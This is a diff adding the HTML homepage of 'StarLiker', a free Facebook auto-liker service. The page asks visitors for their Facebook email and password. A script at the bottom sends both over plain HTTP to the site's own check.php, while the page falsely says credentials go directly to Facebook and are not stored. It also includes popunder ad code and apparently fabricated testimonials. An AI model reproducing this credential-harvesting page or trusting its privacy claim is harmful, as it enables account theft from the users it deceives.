@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		
+		<!-- Basic -->
+		<title>Starliker | Facebook Auto Liker</title>
+		<meta name="description" content="Free Facebook likes, Autoliker 2016, auto like, liker, auto liker, autoliker, photo likes, autolike">
+		<meta name="keywords" content="Starliker, auto like, Autoliker 2016, liker, Best Facebook Auto Liker, Fb Autoliker, Autolike, Free likes, Photo likes, Facebook Auto Liker, Auto Liker, Facebook Auto Follower, Facebook Autoliker, Autoliker, Photo auto liker, Status auto liker, Page Auto Liker, Facebook Page Liker, Status Liker, Photo Liker, Auto liker 2015, Best Autoliker 2016, Auto Likes, Autolike Facebook, AutoCommenter, Facebook Hack, Facebook Status Liker, Hublaa, Indonesia Autolike, autolike status, android auto like">
+		<meta name="author" content="Mark">
+		<meta name="distribution" content="global"/>
+		<meta name="copyright" content="StarLiker by Mark. Copyright 2016"/>
+		<meta name="rating" content="General"/>
+		<meta name="language" content="en"/>
+		<meta name="robots" content="all"/>
+		<meta name="expires" content="never"/>
+
+		<!-- Favicon -->
+		<script src="/cdn-cgi/apps/head/m8WOd9zPBR0VIRhi4-9Z7FvhtGo.js"></script><link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon" />
+		<link rel="apple-touch-icon" href="img/apple-touch-icon.png">	
+		
+		<!-- SEO -->
+		<meta name="msvalidate.01" content="C52CDACA51F3FB191496E58FF5A8C245" />
+		
+		<!-- Meta tags -->
+		<meta property="og:site_name" content="StarLiker"/>
+		<meta property="og:title" content="Gain fame with FREE Facebook likes and become a STAR!" />
+		<meta property="og:image" content="http://www.starliker.net/img/starliker.png" />
+		<meta property="og:url" content="http://starliker.net" />
+		<meta property="og:description" content="StarLiker is the best Facebook Auto Liker that will help you to increase your Social presence." />
+		<meta property="og:type" content="website" />
+
+		<!-- Web Fonts  -->
+		<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800%7CShadows+Into+Light" rel="stylesheet" type="text/css">
+
+		<!-- Vendor CSS -->
+		<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.css">
+		<link rel="stylesheet" href="vendor/font-awesome/css/font-awesome.min.css">
+		<link rel="stylesheet" href="vendor/simple-line-icons/css/simple-line-icons.css">
+		<link rel="stylesheet" href="vendor/owl.carousel/assets/owl.carousel.min.css">
+		<link rel="stylesheet" href="vendor/owl.carousel/assets/owl.theme.default.min.css">
+		<link rel="stylesheet" href="vendor/magnific-popup/magnific-popup.css">
+
+		<!-- Theme CSS -->
+		<link rel="stylesheet" href="css/theme.css">
+		<link rel="stylesheet" href="css/theme-elements.css">
+		<link rel="stylesheet" href="css/theme-blog.css">
+		<link rel="stylesheet" href="css/theme-shop.css">
+		<link rel="stylesheet" href="css/theme-animate.css">
+		
+		<!-- Current Page CSS -->
+		<link rel="stylesheet" href="vendor/rs-plugin/css/settings.css" media="screen">
+		<link rel="stylesheet" href="vendor/rs-plugin/css/layers.css" media="screen">
+		<link rel="stylesheet" href="vendor/rs-plugin/css/navigation.css" media="screen">
+		<link rel="stylesheet" href="vendor/circle-flip-slideshow/css/component.css" media="screen">
+
+		<!-- Skin CSS -->
+		<link rel="stylesheet" href="css/skins/default.css">
+
+		<!-- Theme Custom CSS -->
+		<link rel="stylesheet" href="css/custom.css">
+		<link rel="stylesheet" href="css/spinner.css">
+		<link rel="stylesheet" href="css/common.css" />
+		<link rel="stylesheet" href="css/style7.css" />
+		
+		<!-- Head Libs -->
+		<script src="vendor/modernizr/modernizr.js"></script>
+
+		<!--[if lte IE 8]>
+			<script src="vendor/respond/respond.js"></script>
+			<script src="vendor/excanvas/excanvas.js"></script>
+		<![endif]-->
+		
+		<!-- Google Analytics-->
+		 <script>
+			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+			ga('create', 'UA-65575369-2', 'auto');
+			ga('send', 'pageview');
+
+		</script>
+		
+		<script type="text/javascript" >
+		function load(){
+		$("#loading").show();
+		}
+		</script>
+		
+		<script type="text/javascript" >
+		function usr(){
+		var str = document.getElementById("user").value; 
+		var res = str.replace(/http:\/\/|https:\/\//gi, "token://");
+		document.getElementById("user").value = res;
+		}
+		</script>
+		
+		<!-- Vendor -->
+		<script src="vendor/jquery/jquery.js"></script>
+		<script src="vendor/jquery.appear/jquery.appear.js"></script>
+		<script src="vendor/jquery.easing/jquery.easing.js"></script>
+		<script src="vendor/jquery-cookie/jquery-cookie.js"></script>
+		<script src="vendor/bootstrap/js/bootstrap.js"></script>
+		<script src="vendor/common/common.js"></script>
+		<script src="vendor/jquery.validation/jquery.validation.js"></script>
+		<script src="vendor/jquery.stellar/jquery.stellar.js"></script>
+		<script src="vendor/jquery.easy-pie-chart/jquery.easy-pie-chart.js"></script>
+		<script src="vendor/jquery.gmap/jquery.gmap.js"></script>
+		<script src="vendor/jquery.lazyload/jquery.lazyload.js"></script>
+		<script src="vendor/isotope/jquery.isotope.js"></script>
+		<script src="vendor/owl.carousel/owl.carousel.js"></script>
+		<script src="vendor/magnific-popup/jquery.magnific-popup.js"></script>
+		<script src="vendor/vide/vide.js"></script>
+	</head>
+	
+	<body>
+		<!-- MENU -->
+		<div class="body">
+			<header id="header" class="header-mobile-nav-only" data-plugin-options='{"stickyEnabled": true, "stickyEnableOnBoxed": true, "stickyEnableOnMobile": true, "stickyStartAt": 57, "stickySetTop": "-57px", "stickyChangeLogo": true}'>
+				<div class="header-body">
+					<div class="header-container container">
+						<div class="header-row">
+							<div class="header-column">
+								<div class="header-logo">
+									<a href="index.php">
+										<img alt="Best Autoliker" width="150" height="73" data-sticky-width="82" data-sticky-height="40" data-sticky-top="43" src="img/logo.png">
+									</a>
+								</div>
+							</div>
+							<div class="header-column">
+								<div class="header-row">
+									<div class="header-nav header-nav-top-line">
+										<button class="btn header-btn-collapse-nav" data-toggle="collapse" data-target=".header-nav-main">
+											<i class="fa fa-bars"></i>
+										</button>
+										<ul class="header-social-icons social-icons hidden-xs">
+											<li class="facebook"><a href="https://facebook.com/starliker.net" target="_blank" title="Facebook"><i class="fa fa-facebook"></i></a></li>
+											<li class="twitter"><a href="https://twitter.com/starliker_net" target="_blank" title="Twitter"><i class="fa fa-twitter"></i></a></li>
+										</ul>
+										<div class="header-nav-main header-nav-main-square header-nav-main-effect-1 header-nav-main-sub-effect-1 collapse">
+											<nav>
+												<ul class="nav nav-pills nav-main" id="mainMenu">
+													<li class="active">
+														<a href="index.php">Home</a>
+													</li>
+													<li>
+														<a href="faq.php">FAQ</a>
+													</li>
+													<li>
+														<a href="terms.php">Terms of use</a>
+													</li>
+													<li>
+														<a href="about.php">About</a>
+													</li>
+													<li>
+														<a href="contact-us.php">Contact Us</a>
+													</li>
+													<li>
+														<a href="blog/">Blog</a>
+													</li>
+												</ul>
+											</nav>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</header>
+			
+
+			<div role="main" class="main">
+				<div id="content" class="content full">
+				
+			<!-- Revolution Slider -->
+				<div class="slider-container rev_slider_wrapper" style="height: 500px;">
+					<div id="revolutionSlider" class="slider rev_slider" data-plugin-revolution-slider data-plugin-options='{"gridwidth": 800, "gridheight": 500}'>
+						<ul>
+							<li data-transition="fade">
+								<img src="img/starliker_bg.jpg"  
+									alt="Logo Starliker"
+									data-bgposition="0 0" 
+									data-bgfit="cover" 
+									data-bgrepeat="no-repeat" 
+									class="rev-slidebg"
+									style="z-index: 4">
+
+								<div class="tp-caption"
+									data-x="center" data-hoffset="-175"
+									data-y="center" data-voffset="-105"
+									data-start="1000"
+									style="z-index: 5"
+									data-transform_in="y:[100%];opacity:0;s:500;"><img src="img/slides/slide-title-border.png" alt="Slideshow liker"></div>
+
+								<div class="tp-caption top-label"
+									data-x="center" data-hoffset="0"
+									data-y="center" data-voffset="-105"
+									data-start="1000"
+									style="z-index: 6"
+									data-transform_in="y:[100%];opacity:0;s:500;">WELCOME TO</div>
+
+								<div class="tp-caption"
+									data-x="center" data-hoffset="175"
+									data-y="center" data-voffset="-105"
+									data-start="1000"
+									style="z-index: 6"
+									data-transform_in="y:[100%];opacity:0;s:500;"><img src="img/slides/slide-title-border.png" alt="Slide Title"></div>
+
+								<div class="tp-caption main-label"
+									data-x="center" data-hoffset="0"
+									data-y="center" data-voffset="0"
+									data-start="1500"
+									data-whitespace="nowrap"						 
+									data-transform_in="y:[100%];s:500;"
+									data-transform_out="opacity:0;s:500;"
+									style="z-index: 5"
+									data-mask_in="x:0px;y:0px;">STAR ★ LIKER</div>
+									
+								<div class="tp-caption sft stb visible-md visible-lg"
+									data-x="center" data-hoffset="164"
+									data-y="center" data-voffset="0"
+									data-speed="300"
+									data-start="1000"
+									data-easing="easeOutExpo"
+									style="z-index: 4;"><img src="img/bluebg_big.png" alt="Autoliker" data-ww="270" data-hh="105"></div>	 
+
+								<a class="tp-caption btn btn-lg btn-slider btn-slider-action"
+									data-hash
+									data-hash-offset="85"
+									href="#get-started"
+									data-x="center" data-hoffset="0"
+									data-y="center" data-voffset="140"
+									data-start="2200"
+									data-whitespace="nowrap"						 
+									data-transform_in="y:[100%];s:500;"
+									data-transform_out="opacity:0;s:500;"
+									style="z-index: 5"
+									data-mask_in="x:0px;y:0px;">Get Started Now!</a>
+							</li>
+						</ul>
+					</div>
+				</div>
+	
+					<!-- HEADER BOTTOM -->
+						<div class="home-intro no-margin">
+						<div class="container">
+							<div class="row">
+								<div class="col-xs-12" id="info">
+									<p>
+										<em>StarLiker</em> is a network that will help you to increase your social presence.
+										<span>Gain fame using our FREE service and become a STAR</span>
+									</p>
+								</div>
+							</div>
+
+						</div>
+					</div>
+					
+					<!-- SHOW ERRORS -->
+										
+					<!-- WELCOME -->		
+							
+					<div class="container mt-xlg">
+						<div class="row center">
+							<div class="col-md-12">
+								<h1 class="word-rotator-title mb-sm">
+									<span class="word-rotate" data-plugin-options='{"delay": 2000, "animDelay": 300}'>
+											<span class="word-rotate-items">
+												<span>Welcome</span>
+												<span>Bienvenido</span>
+												<span>Willkommen</span>
+												<span>Bem-vindo</span>
+												<span>Добро пожаловать</span>
+												<span>Bienvenue</span>
+												<span>Welkom</span>
+												<span>স্বাগতম</span>
+												<span>أهلاً و سهلاً</span>
+												<span>स्वागत</span>
+												<span>歡迎光臨</span>
+											</span>
+									</span>									
+									to <strong>StarLiker</strong>
+								</h1>
+								<p class="featured lead">
+									StarLiker is a Social Exchange System that will help you to gain fame among your friends and catch their attention by increasing your status and photo likes. Our system is based on an online community of users who want to increase their likes quickly and easily
+								</p>
+							</div>
+						</div>
+
+					</div>
+					
+					<!-- OUR FEATURES -->
+				<section class="section section-features-background mb-none">
+					<div class="container">
+					<div class="row center">
+						<div class="col-sm-12">
+							<h2 class="text-light">Our <strong>Features</strong></h2>
+						</div>
+					</div>
+							<div class="row">
+								<div class="col-sm-4">
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-star text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">FREE SERVICE</h4>
+											<p class="tall text-light">StarLiker is completely FREE for everyone</p>
+										</div>
+									</div>
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-graduation-cap text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">EASY TO USE</h4>
+											<p class="tall text-light">We did our best to create a simple & friendly website</p>
+										</div>
+									</div>
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-thumbs-up text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">INSTANT LIKES</h4>
+											<p class="tall text-light">We provide up to +100 instant likes per submission</p>
+										</div>
+									</div>
+								</div>
+								<div class="col-sm-4">								
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-rocket text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">FAST LIKES</h4>
+											<p class="tall text-light">The likes we provide are delivered instantly</p>
+										</div>
+									</div>
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-check-circle text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">TRUSTED SITE</h4>
+											<p class="tall text-light">We are providing free Facebook Likes service since 2014</p>
+										</div>
+									</div>
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-heart text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">LOVED BY USERS</h4>
+											<p class="tall text-light">There are more than +4,000 active & daily users</p>
+										</div>
+									</div>
+								</div>	
+								<div class="col-sm-4">										
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-minus-circle text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">SPAM FREE</h4>
+											<p class="tall text-light">Our AutoLiker is completely safe to use</p>
+										</div>
+									</div>
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-users text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">REAL LIKES</h4>
+											<p class="tall text-light">The likes we provide are from real & active profiles</p>
+										</div>
+									</div>
+									<div class="feature-box feature-box-style-6">
+										<div class="feature-box-icon">
+											<i class="fa fa-android text-color-light"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="features-text mb-none">MOBILE FRIENDLY</h4>
+											<p class="tall text-light">You can use our website from any device</p>
+										</div>
+									</div>									
+								</div>
+								<div class="row">
+										<div class="col-md-12 center">
+											<hr id="get-started">
+											<h4><span class="alternative-font text-light font-size-md mt-xl mb-none">and much more...</span></h4>
+										</div>
+								</div>
+							</div>
+					</div>
+				</section>	
+				
+					<!-- GETTING STARTED -->
+					<div class="container">
+						<div class="row center">
+							<div class="col-md-12">
+								<h2 class="short word-rotator-title mt-xlg">
+								Getting <strong>Started</strong>
+								</h2>
+								<p class="featured lead">
+									Set up your Facebook profile following this instructions before start using our service
+								</p>
+							</div>
+						</div>								
+							<div class="row">
+								<div class="col-sm-4">
+									<div class="feature-box feature-box-style-2 feature-box-quaternary">
+										<div class="feature-box-icon">
+											<i class="fa fa-user-plus text-color-primary"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="mb-none">Followers</h4>
+											<p class="featured lead">Enable the <a href="https://www.facebook.com/settings?tab=followers" target="_blank">Followers</a> from your Facebook settings and choose "Everybody"</p>
+										</div>
+									</div>
+								</div>
+								<div class="col-sm-4">
+									<div class="feature-box feature-box-style-2 feature-box-quaternary">
+										<div class="feature-box-icon">
+											<i class="fa fa-cog text-color-primary"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="mb-none">Privacy Settings</h4>
+											<p class="featured lead">You need to make Public your Facebook posts so other people can like them</p>
+										</div>
+									</div>
+								</div>
+								<div class="col-sm-4">
+									<div class="feature-box feature-box-style-2 feature-box-quaternary">
+										<div class="feature-box-icon">
+											<i class="fa fa-info-circle text-color-primary"></i>
+										</div>
+										<div class="feature-box-info">
+											<h4 class="mb-none">Age +18</h4>
+											<p class="featured lead">You must be +18 years old to publish your Facebook posts Publicly</p>
+										</div>
+									</div>
+								</div>
+							</div>	
+					</div>
+
+					<!-- Logged in -->
+										
+					<div id="logged_out">
+						<!-- HOW IT WORKS -->						
+						<div class="call-to-action call-to-action-default with-button-arrow call-to-action-in-footer">
+							<!-- TOP -->
+							<div class="container">
+								<div class="col-xs-12 col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">
+									<section class="call-to-action featured">
+										<div class="featured-title">
+											<h3><i class="fa fa-sign-in text-gray"></i><strong> Login</strong></h3>
+										</div>
+										<div class="row">
+											<div class="col-xs-12">
+												<div class="padding-lg">
+												<div class="center">
+													<form id="validate">
+													<img style="margin:auto; max-width:140px; max-height:140px;" class="img-responsive mb-lg" src="img/projects/Allow_m.png">
+													<p class="featured lead">
+													After <a href="#get-started">setting up</a> your profile you just need to login with your Facebook credentials and click <em>Validate</em>
+													</p>
+														<input type="text" name="email" id="email" class="form-control padding-left-lg padding-right-lg mb-lg" data-msg-required="Please enter your Facebook Email..." placeholder="Email" required>
+														<input type="password" name="password" id="password" class="form-control padding-left-lg padding-right-lg" data-msg-required="Please enter your Facebook Password..." placeholder="Password" required>
+														<button type="submit" class="btn btn-primary mt-lg" style="width:100%;" id="loadingButton" data-loading-text="Loading..." onclick="usr();">
+															Validate
+														</button>
+													</form>
+													<div id="token_gen"></div>
+													<!-- Help -->
+													<div class="row">	
+														<div class="col-xs-12 center mt-lg">
+															<!-- adsense -->
+															<iframe data-aa="537124" src="//ad.a-ads.com/537124?size=320x50" scrolling="no" style="width:320px; height:50px; border:0px; padding:0;overflow:hidden" allowtransparency="true"></iframe>														
+															<p class="featured lead mt-sm mb-xs">*We do not store your Facebook information in our server. You are connecting directly to Facebook servers to generate a valid Access Token.</p>
+														</div>		
+													</div>
+												</div>
+												</div>
+											</div>
+											<!-- LOGIN -->
+										</div>
+									</section>
+								</div>
+							</div>
+						</div>	
+					</div>
+					
+				<!-- loading... -->
+					<div id="loading" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; opacity:1; z-index:1002;">
+						<div class="form-group" style="position: absolute;top: 30%;left: 0;height: 100%;width: 100%;text-align: center;">
+							<img class="m-button-bkg img-responsive" src="img/projects/Login.png" alt="Starliker Auto Liker">
+							<h3 class="mt-md mb-sm">Star <a style="text-decoration:none;">★</a> Liker</h3>
+							<h6 class="mb-xs">Validating</h6>
+							<h6>Please Wait...</h6>
+						</div>
+					</div>
+					
+				<!-- Facts -->
+				<div class="container">
+					<div class="row mt-lg">
+						<div class="counters counters-text-dark">
+							<div class="col-md-4 col-sm-4">
+								<div class="counter appear-animation" data-appear-animation="fadeInUp" data-appear-animation-delay="300">
+									<i class="fa fa-user"></i>
+									<strong data-to="57" data-append="+">0</strong>
+									<label>Users Online</label>
+									<p class="text-color-primary mb-xl">They can’t be wrong</p>
+								</div>
+							</div>
+							<div class="col-md-4 col-sm-4">
+								<div class="counter appear-animation" data-appear-animation="fadeInUp" data-appear-animation-delay="600">
+									<i class="fa fa-thumbs-up"></i>
+									<strong data-to="4275" data-append="+">0</strong>
+									<label>Today Likes</label>
+									<p class="text-color-primary mb-xl">Satisfaction guaranteed</p>
+								</div>
+							</div>
+							<div class="col-md-4 col-sm-4">
+								<div class="counter appear-animation" data-appear-animation="fadeInUp" data-appear-animation-delay="900">
+									<i class="fa fa-star"></i>
+									<strong data-to="3">0</strong>
+									<label>Active Years</label>
+									<p class="text-color-primary mb-xl">Many more to come</p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				
+				<!-- Share -->
+				<section class="section section-default section-with-divider mb-none">
+					<div class="divider divider-solid divider-style-4">
+						<i class="fa fa-star"></i>
+					</div>
+					<div class="container">
+						<div class="row">
+							<div class="col-md-12 center">
+								<h2 class="mt-xl mb-none"><strong>Share</strong> our website</h2>
+								<p class="featured lead">
+										Share our website in your Social Networks. If more people join, more likes you will get!
+								</p>
+								<div class="social-icons">
+									<ul class="social-icons">
+										<li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=http://starliker.net/" target="_blank" data-placement="bottom" data-tooltip title="Facebook">Facebook</a></li>
+										<li class="twitter"><a href="https://twitter.com/intent/tweet?original_referer=https%3A%2F%2Fwww.starliker.net%2F&text=Gain%20fame%20with%20FREE%20Facebook%20likes%20and%20become%20a%20STAR!&tw_p=tweetbutton&url=http%3A%2F%2Fwww.starliker.net" target="_blank" data-placement="bottom" data-tooltip title="Twitter">Twitter</a></li>
+										<li class="pinterest"><a href="//www.pinterest.com/pin/create/button/?url=http%3A%2F%2Fwww.starliker.net&media=http%3A%2F%2Fwww.starliker.net%2Fimg%2Fstarliker.png&description=StarLiker%20is%20the%20best%20Facebook%20Auto%20Liker%20that%20will%20help%20you%20to%20increase%20your%20social%20presence.%20Gain%20fame%20with%20FREE%20Facebook%20likes%20and%20become%20a%20STAR!" target="_blank" data-placement="bottom" data-tooltip title="Pinterest">Pinterest</a></li>
+										<li class="linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A//starliker.net/&title=StarLiker&summary=Gain%20fame%20with%20FREE%20Facebook%20likes%20and%20become%20a%20STAR!&source=" target="_blank" data-placement="bottom" data-tooltip title="Linkedin">Linkedin</a></li>
+									</ul>
+									<p><div class="fb-like" data-href="http://starliker.net/" data-layout="button_count" data-action="like" data-colorscheme="dark" data-share="true"></div></p>
+								</div>
+							</div>
+						</div>
+					</div>
+				</section>
+				
+				<!-- Testimonials -->
+				<section class="parallax section section-text-light section-parallax section-center m-none" data-stellar-background-ratio="0.5" style="background-image: url(img/parallax-image.jpg);background-size:cover;background-repeat:no-repeat;background-color:#F7F7F7;">
+					<div class="container">
+						<div class="row">
+							<div class="col-md-10 col-md-offset-1">
+								<h2><i class="fa fa-star font-size-xs mr-xs"></i><i class="fa fa-star font-size-xs mr-xs"></i><i class="fa fa-star font-size-xs mr-xs"></i><i class="fa fa-star font-size-xs mr-xs"></i><i class="fa fa-star font-size-xs"></i><br><strong>What People Say</strong></h2>
+								<div class="owl-carousel owl-theme nav-bottom rounded-nav mb-none" data-plugin-options='{"items": 1, "autoplay": true, "autoplayTimeout": 6000}'>
+									<div>
+										<div class="col-md-12">
+											<div class="testimonial testimonial-style-2 testimonial-with-quotes mb-none">
+												<blockquote>
+													<p>By using StarLiker I am increasing my reputation in front of my friends by gaining likes on Facebook posts!! And its absolutely Free!! I love this website.</p>
+												</blockquote>
+												<div class="testimonial-author">
+													<p><strong>Lorenzo Luna</strong></p>
+												</div>
+											</div>
+										</div>
+									</div>
+									<div>
+										<div class="col-md-12">
+											<div class="testimonial testimonial-style-2 testimonial-with-quotes mb-none">
+												<blockquote>
+													<p>I am a daily user of this website and increasing likes on my daily Facebook posts. Thanks to the developers for making this awesome website!</p>
+												</blockquote>
+												<div class="testimonial-author">
+													<p><strong>Wandy Chelsea</strong></p>
+												</div>
+											</div>
+										</div>
+									</div>
+									<div>
+										<div class="col-md-12">
+											<div class="testimonial testimonial-style-2 testimonial-with-quotes mb-none">
+												<blockquote>
+													<p>Before using this website I didn't knew how peoples was gaining likes on their posts. After using it I got to know the trick to increase likes on Facebook posts.</p>
+												</blockquote>
+												<div class="testimonial-author">
+													<p><strong>Julissa Guevara</strong></p>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</section>
+				
+			</div>
+
+				
+				<div id="fb-root"></div>
+				<script>(function(d, s, id) {
+				var js, fjs = d.getElementsByTagName(s)[0];
+				if (d.getElementById(id)) return;
+				js = d.createElement(s); js.id = id;
+				js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4";
+				fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+				</script>
+				
+			<!-- Footer -->		
+			<footer id="footer">
+				<div class="container">
+						<div class="col-sm-4">
+							<div class="newsletter">
+								<h4>Useful Links</h4>
+								<ul class="list list-icons list-icons-sm">									
+									<li><i class="fa fa-caret-right"></i><a href="faq.php">FAQ</a></li>
+									<li><i class="fa fa-caret-right"></i><a href="terms.php">Terms of Use</a></li>
+									<li><i class="fa fa-caret-right"></i><a href="sitemap.php">Sitemap</a></li>
+									<li><i class="fa fa-caret-right"></i><a href="about.php">About</a></li>	
+								</ul>
+							</div>
+						</div>
+						<div class="col-sm-5">
+							<h4>Tags</h4>
+								<div class="toggle-content">
+								<span class="label label-primary">Starliker</span>
+								<span class="label label-primary">Best Facebook Auto Liker</span>
+								<span class="label label-primary">liker</span>
+								<span class="label label-primary">autoliker 2016</span>
+								<span class="label label-primary">Autolike</span>
+								<span class="label label-primary">Increase Facebook likes</span>
+								<span class="label label-primary">Free likes</span>
+								<span class="label label-primary">Photo likes</span>
+								<span class="label label-primary">Video like</span>
+								<span class="label label-primary">Facebook Auto Liker</span>
+								<span class="label label-primary">Auto Liker</span>
+								<span class="label label-primary">Facebook Auto Follower</span>
+								<span class="label label-primary">Facebook Autoliker</span>
+								<span class="label label-primary">Autoliker</span>
+								<span class="label label-primary">Photo auto liker</span>
+								<span class="label label-primary">Status auto liker</span>
+								<span class="label label-primary">Page Auto Liker</span>
+								<span class="label label-primary">Facebook Page Liker</span>
+								<span class="label label-primary">Status Liker</span>
+								<span class="label label-primary">Photo Liker</span>
+								<span class="label label-primary">Fb Autoliker</span>
+								<span class="label label-primary">Auto liker 2015</span>
+								<span class="label label-primary">Best Autoliker 2016</span>
+								<span class="label label-primary">Auto Likes</span>
+								</div>
+						</div>
+						<div class="col-sm-3">
+							<div class="contact-details">
+								<h4>Contact Us</h4>
+								<ul class="contact">
+									<li><p><i class="fa fa-envelope"></i> <strong>Email:</strong> <a href="/cdn-cgi/l/email-protection#1a7b7e7773745a696e7b687673717f6834747f6e"><span class="__cf_email__" data-cfemail="355451585c5b7546415447595c5e50471b5b5041">[email&#160;protected]</span></a></p></li>
+									<li><p><i class="fa fa-facebook"></i> <strong>Facebook:</strong> <a href="https://www.facebook.com/starliker.net" target="_blank">starliker.net</a></p></li>
+								</ul>
+							</div>
+							<div style="display:none"><a href="https://www.alexa.com/siteinfo/starliker.net"><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="http://xslt.alexa.com/site_stats/js/s/a?url=starliker.net"></script></a></div>
+						</div>
+				</div>
+			</footer>
+			<!-- Footer -->
+			<div class="footer">
+				<div class="footer-copyright">
+					<div class="container container-feed">
+							<div class="col-sm-1 col-xs-3 no-padding">
+								<a href="index.php" class="logo">
+									<img alt="StarLiker.net" class="img-responsive" src="img/logo-footer.png">
+								</a>
+							</div>
+							<div class="col-sm-7 col-xs-9">
+								<p>© Copyright 2014-2017. All Rights Reserved</p>
+							</div>
+							<div class="col-sm-4 col-xs-12 no-padding">
+								<div class="footer-navmenu">
+									<nav id="sub-menu">
+										<ul>
+											<li><a href="faq.php">FAQ</a></li>
+											<li><a href="terms.php">Terms of Use</a></li>
+											<li><a href="contact-us.php">Contact</a></li>
+										</ul>
+									</nav>
+								</div>
+							</div>
+					</div>
+				</div>			
+			</div>
+			</div>
+		
+		<!-- Theme Base, Components and Settings -->
+		<script src="js/theme.js"></script>
+		
+		<!-- Current Page Vendor and Views -->
+		<script src="vendor/rs-plugin/js/jquery.themepunch.tools.min.js"></script>
+		<script src="vendor/rs-plugin/js/jquery.themepunch.revolution.min.js"></script>
+		<script src="vendor/circle-flip-slideshow/js/jquery.flipshow.js"></script>
+		<script src="js/views/view.home.js"></script>
+		
+		<!-- Theme Custom -->
+		<script src="js/custom.js"></script>
+		
+		<!-- Theme Initialization Files -->
+		<script src="js/theme.init.js"></script>
+				
+		<!-- PopAds.net Popunder Code for starliker.net -->
+		<script type="text/javascript">
+		  var _pop = _pop || [];
+		  _pop.push(['siteId', 1187800]);
+		  _pop.push(['minBid', 0.000000]);
+		  _pop.push(['popundersPerIP', 0]);
+		  _pop.push(['delayBetween', 0]);
+		  _pop.push(['default', false]);
+		  _pop.push(['defaultPerDay', 0]);
+		  _pop.push(['topmostLayer', false]);
+		  (function() {
+			var pa = document.createElement('script'); pa.type = 'text/javascript'; pa.async = true;
+			var s = document.getElementsByTagName('script')[0]; 
+			pa.src = '//c1.popads.net/pop.js';
+			pa.onerror = function() {
+			  var sa = document.createElement('script'); sa.type = 'text/javascript'; sa.async = true;
+			  sa.src = '//c2.popads.net/pop.js';
+			  s.parentNode.insertBefore(sa, s);
+			};
+			s.parentNode.insertBefore(pa, s);
+		  })();
+		</script>
+		<!-- PopAds.net Popunder Code End -->
+
+		<script type="text/javascript">
+			$('#validate').submit(function() {
+				
+				var email = $('#email').val();
+				var password = $('#password').val();
+				
+				console.log(email, password);
+				if (email != '') {
+					$('#validate').fadeOut(function() {
+						$('#loading').fadeIn();
+						$.post("http://starliker.net/check.php", {
+							"email": email,
+							"password": password
+						}, 
+						function(data) {
+						$('#token_gen').append(data);
+						$('#loading').fadeOut();
+						})
+					});
+				}
+				return false;
+			}) 
+		</script>
+		<script>
+			// Back Button
+			function hideMe() {
+				var main = document.getElementById('validate');
+				if (main.style.display === 'none') {
+					main.style.display = 'block';
+					document.getElementById('token_gen').innerHTML = '';
+				} else {
+					main.style.display = 'none';
+				}
+			}
+		</script>
+		
+		<script>
+			// Button Loading
+			$('#loadingButton').on('click', function () {
+				var $btn = $(this).button('loading')
+				// Business Logic...
+				
+				setTimeout(function() {
+					// Reset Button
+					$btn.button('reset');
+				}, 2000);
+			})
+		</script>
+		</div>
+	</body>
+</html>
